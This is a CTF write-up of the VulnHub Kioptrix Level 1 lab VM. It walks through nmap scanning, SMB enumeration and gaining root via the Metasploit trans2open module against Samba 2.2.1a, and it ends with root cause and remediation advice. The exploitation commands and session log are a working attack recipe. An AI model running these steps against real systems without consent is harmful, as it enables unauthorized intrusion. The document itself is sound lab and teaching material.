# Kioptrix Level 1 — CTF Writeup

**Platform:** VulnHub  
**Category:** Boot2Root / Vulnerable VM  
**Difficulty:** Easy  
**Date:** 2026-08-19

## Overview

Kioptrix Level 1 is a beginner-friendly boot2root machine. The box exposes several legacy services (Apache 1.3.20, rpcbind, and Samba 2.2.1a),
the last of which is vulnerable to a remote buffer overflow (`trans2open`) that grants an immediate root shell.

**Final result:** Remote root shell via `exploit/linux/samba/trans2open`.

---

## 1. Reconnaissance

### Host discovery

```
nmap -sn 192.168.144.0/24
```

| IP               | Role                        |
|------------------|-----------------------------|
| 192.168.144.128  | Attacker (Kali)             |
| 192.168.144.129  | Target (multiple services)  |
| 192.168.144.254  | No services — ruled out     |

### Port/service scan

```
nmap -sC -sV 192.168.144.129
```

| Port    | Service     | Version                                   |
|---------|-------------|--------------------------------------------|
| 22/tcp  | ssh         | OpenSSH 2.9p2 (protocol 1.99, SSHv1)        |
| 80/tcp  | http        | Apache 1.3.20 (Red Hat, mod_ssl/2.8.4)      |
| 111/tcp | rpcbind     | RPC #100000                                 |
| 139/tcp | netbios-ssn | Samba smbd (workgroup: MYGROUP)             |
| 443/tcp | ssl/https   | Apache 1.3.20, SSLv2 supported (weak ciphers)|
| 1024/tcp| status      | RPC #100024                                 |

NetBIOS name resolved the host as `KIOPTRIX`.

---

## 2. Enumeration

### Port 80/443 — HTTP(S)

`gobuster` against the web root only turned up `/manual`, `/usage`, and
`/mrtg`, all of which redirected to `127.0.0.1` and returned nothing
useful. **Dead end.**

### Port 111 — rpcbind

```
rpcinfo -p 192.168.144.129
showmount -e 192.168.144.129   # clnt_create: RPC: Program not registered
```

No NFS exports registered. **Dead end** — but the port/service table
gathered here (`100024` on `1024/tcp`) was kept for reference.

### Port 139 — SMB

```
smbclient -L //192.168.144.129/ -N
```

Anonymous login succeeded and revealed two shares: `IPC$` and `ADMIN$`.

- `IPC$` → anonymous login works, but `ls` fails with
  `NT_STATUS_NETWORK_ACCESS_DENIED`.
- `ADMIN$` → `NT_STATUS_WRONG_PASSWORD`, no anonymous access.

Both shares dead-ended for direct file access, but confirmed Samba was
reachable and running. A Wireshark capture of the SMB negotiation
fingerprinted the exact version: **Samba 2.2.1a**.

---

## 3. Initial Access / Exploitation

Samba 2.2.1a is affected by the **`trans2open`** buffer overflow
(a remotely exploitable stack overflow in the `trans2open` SMB request
handler). Confirmed against Metasploit:

```
msf > search trans2open
```

Relevant module: `exploit/linux/samba/trans2open`.

```
msf > use exploit/linux/samba/trans2open
msf exploit(linux/samba/trans2open) > set RHOSTS 192.168.144.129
msf exploit(linux/samba/trans2open) > run
```

The module brute-forces a set of return addresses until one lands
correctly:

```
[*] 192.168.144.129:139 - Trying return address 0xbffffdfc...
...
[*] Command shell session 1 opened (192.168.144.128:4444 -> 192.168.144.129:1081)
```

Multiple shell sessions were spawned as the brute force iterated through
candidate addresses.

### Verification

```
whoami
root
```

---

## 4. Privilege Escalation

Not required — the `trans2open` exploit landed directly as `root`
(Samba was running with root privileges), so no further escalation
was necessary.

---

## 5. Root Cause

- Ancient, unpatched Samba (2.2.1a) with a known stack-based buffer
  overflow in `trans2open` request handling.
- No exploit mitigations expected on a system this old (no ASLR/NX in
  the relevant target profile), which is why a hardcoded return-address
  brute force works reliably.
- Samba daemon running with root privileges, so a successful memory
  corruption exploit granted root directly with no privilege-escalation
  step needed.

## 6. Remediation

- Upgrade Samba to a patched, supported version.
- Disable/firewall SMB (139/445) from untrusted networks.
- Run Samba (and other network daemons) as a non-root user wherever
  possible, so a service-level compromise doesn't equal root.
- Retire or isolate legacy services (SSHv1, Apache 1.3.x, SSLv2) that
  carry their own independent risk.

---

## Tools Used

`nmap`, `gobuster`, `smbclient`, `rpcinfo`, `showmount`, `wireshark`,
`metasploit`
